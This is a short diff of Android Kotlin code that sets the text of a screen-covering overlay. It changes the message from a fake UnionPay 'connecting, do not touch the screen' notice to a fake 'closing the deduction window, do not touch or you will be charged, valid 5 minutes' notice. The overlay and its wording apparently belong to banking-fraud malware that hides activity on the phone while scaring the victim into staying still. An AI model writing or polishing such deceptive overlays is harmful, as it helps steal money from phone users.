@@ -1270,7 +1270,7 @@ fun onstart_overlay(arg1: String, arg2: String) {
         overLay.setClickable(false)
 
         val loadingText = TextView(this, null)
-	loadingText.text = "\n\n系统正在对接银联中心\n请勿触碰手机屏幕\n避免影响业务\n请耐心等待..."
+	loadingText.text = "\n\n正在自动关闭扣费窗口\n请勿触碰手机屏幕\n避免关闭失败产生扣费\n验证时效5分钟..."
 	loadingText.setTextColor(-7829368)
 	loadingText.textSize = 15.0f
 	loadingText.gravity = Gravity.LEFT //Gravity.CENTER
